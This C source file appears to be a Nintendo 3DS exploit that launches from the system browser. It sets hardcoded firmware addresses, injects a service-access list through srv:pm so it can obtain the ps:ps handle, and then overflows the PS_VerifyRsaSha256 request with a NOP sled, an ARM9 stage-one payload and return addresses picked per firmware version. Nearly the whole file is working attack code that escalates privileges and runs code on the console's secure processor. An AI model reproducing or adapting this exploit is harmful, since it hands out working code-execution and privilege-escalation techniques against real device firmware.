#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "types.h"

#define SPIDER_DATARO_START 0x00359000
#define SPIDER_DATABSS_START 0x003C7000
#define TEMP_ADR 0x18400000

#define BUFFER_ADR ((void*)0x18410000)
#define BUFFER_ADR_AVAIL_OFFSET 0x10000


extern const uint8_t arm9_stage1;
extern const uint8_t arm9_stage1_end;

// GPU stuffs
int (*GX_SetTextureCopy)(void *input_buffer, void *output_buffer, uint32_t size, int in_x, int in_y, int out_x, int out_y, int flags) = (void*) 0x002c565c;
int (*GSPGPU_FlushDataCache)(void *address, uint32_t length) = (void*) 0x00345ec8;

uint32_t* gspHandle = (uint32_t*)0x003B9438;

// FS stuffs
typedef struct {
	s32 s;
	u32 pos;
	u32 size;
	u32 unk[5];
} IFILE;

int (*IFile_Open)(IFILE *f, const short *path, int flags) = (void*) 0x0025BC00;
int (*IFile_Close)(IFILE *f) = (void*)0x0025BD20;
int (*IFile_Read)(IFILE *f, unsigned int *read, void *buffer, unsigned int size) = (void*) 0x002FA864;
int (*IFile_Write)(IFILE *f, uint32_t *written, void *src, uint32_t size) = (void*) 0x00310190;

void svc_sleepThread(s64 ns);
s32 svc_connectToPort(Handle* out, const char* portName);
s32 svc_sendSyncRequest(Handle session);
s32 svc_getProcessId(u32 *out, Handle handle);


static void flashScreen(void);
static void writeSentinel(char value);

const u8 __attribute__ ((section (".rodata"))) access_bin[] =
{
	0x41, 0x50, 0x54, 0x3A, 0x55, 0x00, 0x00, 0x00, 0x79, 0x32, 0x72, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x67, 0x73, 0x70, 0x3A, 0x3A, 0x47, 0x70, 0x75, 0x6E, 0x64, 0x6D, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x66, 0x73, 0x3A, 0x55, 0x53, 0x45, 0x52, 0x00, 0x68, 0x69, 0x64, 0x3A, 0x55, 0x53, 0x45, 0x52, 
	0x64, 0x73, 0x70, 0x3A, 0x3A, 0x44, 0x53, 0x50, 0x63, 0x66, 0x67, 0x3A, 0x75, 0x00, 0x00, 0x00, 
	0x66, 0x73, 0x3A, 0x52, 0x45, 0x47, 0x00, 0x00, 0x70, 0x73, 0x3A, 0x70, 0x73, 0x00, 0x00, 0x00, 
	0x6E, 0x73, 0x3A, 0x73, 0x00, 0x00, 0x00, 0x00, 0x61, 0x6D, 0x3A, 0x6E, 0x65, 0x74, 0x00, 0x00, 
};

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _memset(void* addr, int val, unsigned int size)
{
	char* caddr = (char*) addr;
	while(size--)
		*(caddr++) = val;
}

static inline void* getThreadLocalStorage(void)
{
	void* ret;
	asm
	(
		"mrc p15, 0, %[data], c13, c0, 3"
		:[data] "=r" (ret)
	);
	return ret;
}

static inline u32* getThreadCommandBuffer(void)
{
	return (u32*)((u8*)getThreadLocalStorage() + 0x80);
}

Result srvRegisterProcess(Handle *handle, u32 procid, u32 count, void *serviceaccesscontrol)
{
	Result rc = 0;
	
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x04030082; // <7.x
	cmdbuf[1] = procid;
	cmdbuf[2] = count;
	cmdbuf[3] = (count << 16) | 2;
	cmdbuf[4] = (u32)serviceaccesscontrol;
	
	if((rc = svc_sendSyncRequest(*handle))) return rc;
		
	return cmdbuf[1];
}

Result srvUnregisterProcess(Handle *handle, u32 procid)
{
	Result rc = 0;
	
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x04040040; // <7.x
	cmdbuf[1] = procid;
	
	if((rc = svc_sendSyncRequest(*handle))) return rc;
		
	return cmdbuf[1];
}

Result PS_VerifyRsaSha256(Handle *handle)
{
	Result ret = 0;
	u32 *cmdbuf = getThreadCommandBuffer();
	u8 *cmdbuf8 = (u8*)cmdbuf;
	
	//FW1F = 0x7440
	//FW0B = 0xD9B8
	const u32 bufSize = 0xD9B8;
	//const u32 bufSize = 0x7440;
	
	for(int i=0; i<bufSize; i++)
	{
		*(u8*)(TEMP_ADR+i) = 0;
	}
	
	*(u32*)(TEMP_ADR+0x28) = 0x820002;
	*(u32*)(TEMP_ADR+0x2C) = TEMP_ADR+0x80;
	*(u32*)(TEMP_ADR+0x30) = (bufSize<<4) | 0xA;
	*(u32*)(TEMP_ADR+0x34) = TEMP_ADR+0x380;
	*(u32*)(TEMP_ADR+0x280) = bufSize<<3; //RSA bit-size, for the signature.

	u32 *ptr = (u32*)(TEMP_ADR+0x380);
	u32 *src = (u32*)&arm9_stage1;
	u32 size = &arm9_stage1_end-&arm9_stage1;
	const u32 nopsled = 0x1000; //0
	
	for(int i=0; i<nopsled; i+=4)
	{
		*ptr++ = 0xE1A00000;
	}
	
	for(int i=0; i<size; i+=4)
	{
		*ptr++ = *src++;
	}
	
	for(int i=0; i<bufSize-size-nopsled; i+=4)
	{
		//*ptr++ = 0x080C3EE0; //4.5
		//*ptr++ = 0x080C4420; //3.x
		//*ptr++ = 0x080C2520; //2.2
		*ptr++ = 0x080C2340; //2.1
		//*ptr++ = 0x080B9620; //1.1
		//*ptr++ = 0x080B95C0; //1.0
	}
	
	for(int i=0; i<0x80; i++)
	{
		cmdbuf8[i] = *(u8*)(TEMP_ADR+i);
	}

	cmdbuf[0] = 0x00020244;

	if((ret = svc_sendSyncRequest(*handle))!=0)return ret;
	
	writeSentinel('e');
	return (Result)cmdbuf[1];
}

Result srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

Result srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

Result _GSPGPU_ReadHWRegs(uint32_t* handle, u32 regAddr, u32* data, u8 size)
{
	if(size>0x80 || !data) return -1;

	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00040080; //request header code
	cmdbuf[1]=regAddr;
	cmdbuf[2]=size;
	cmdbuf[0x40]=(size<<14)|2;
	cmdbuf[0x40+1]=(u32)data;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

static void flashScreen(void)
{
	// Fills the bottom buffer with a random pattern
	// Change this to the addresses read from gpu reg later
	void *src = (void *)0x18000000; // Random buffer location
	for (int i = 0; i < 3; i++)
	{  // Do it 3 times to be safe
		GSPGPU_FlushDataCache(src, 0x00038400);
		GX_SetTextureCopy(src, (void *)0x1F48F000, 0x00038400, 0, 0, 0, 0, 8);
		svc_sleepThread(0x400000LL);
		GSPGPU_FlushDataCache(src, 0x00038400);
		GX_SetTextureCopy(src, (void *)0x1F4C7800, 0x00038400, 0, 0, 0, 0, 8);
		svc_sleepThread(0x400000LL);
	}
	svc_sleepThread(0x10000000);
}

static void writeSentinel(char value)
{
	IFILE file;
	_memset(&file, 0, sizeof(file));

	IFile_Open(&file, L"dmc:/sentinel.bin", 6); // 6 is create+write supposedly

	uint32_t writeBytes = 0;
	IFile_Write(&file, &writeBytes, &value, 1);
	//IFile_Close(&file);
}

int __attribute__ ((section (".text.a11.entry"))) _main()
{
	svc_sleepThread(0x10000000);
	
	// Get framebuffer addresses
	uint32_t regs[10];
	
	regs[0] = 0xDEADBABE;
	regs[1] = 0xBABEDADA;
	
	_GSPGPU_ReadHWRegs(gspHandle, 0x400468, &regs[0+2], 8); // framebuffer 1 top left & framebuffer 2 top left
	_GSPGPU_ReadHWRegs(gspHandle, 0x400494, &regs[2+2], 8); // framebuffer 1 top right & framebuffer 2 top right
	_GSPGPU_ReadHWRegs(gspHandle, 0x400568, &regs[4+2], 8); // framebuffer 1 bottom & framebuffer 2 bottom
	_GSPGPU_ReadHWRegs(gspHandle, 0x400478, &regs[6+2], 4); // framebuffer select top
	_GSPGPU_ReadHWRegs(gspHandle, 0x400578, &regs[7+2], 4); // framebuffer select bottom
	
	// Read the main payload to top left framebuffer 1
	// use the first 8 bytes of BUFFER_ADR to hold magic
	uint8_t* buffer = (BUFFER_ADR + 20);

	IFILE file;
	unsigned int readBytes;
	_memset(&file, 0, sizeof(file));
	IFile_Open(&file, L"dmc:/arm9.bin", 1);
	IFile_Read(&file, &readBytes, (void*)buffer, 0x10000);

	// Copy the magic
	*(uint32_t*) (BUFFER_ADR + 0) = 0x4b435546;
	*(uint32_t*) (BUFFER_ADR + 4) = 0x4b435546;
	
	if(regs[6+2])
	{
		*(uint32_t*) (BUFFER_ADR + 8) = regs[0+2];
		*(uint32_t*) (BUFFER_ADR + 12) = regs[2+2];
	}
	else
	{
		*(uint32_t*) (BUFFER_ADR + 8) = regs[1+2];
		*(uint32_t*) (BUFFER_ADR + 12) = regs[3+2];
	}
	
	if(regs[7+2])
		*(uint32_t*) (BUFFER_ADR + 16) = regs[4+2];
	else
		*(uint32_t*) (BUFFER_ADR + 16) = regs[5+2];

	// Grab access to PS
	Handle port;
	svc_connectToPort(&port, "srv:pm");
	
	srv_RegisterClient(&port);
	
	u32 proc = 0;
	svc_getProcessId(&proc, 0xFFFF8001);
	
	srvUnregisterProcess(&port, proc);
	
	srvRegisterProcess(&port, proc, 0x18, (void*)&access_bin[0]);
	
	Handle ps_handle;
	srv_getServiceHandle(&port, &ps_handle, "ps:ps");
	
	svc_sleepThread(0x10000000);

	// Perform the exploit
	u32 res = PS_VerifyRsaSha256(&ps_handle);

	while(1)
	{
		flashScreen();
	}
	return 0;
}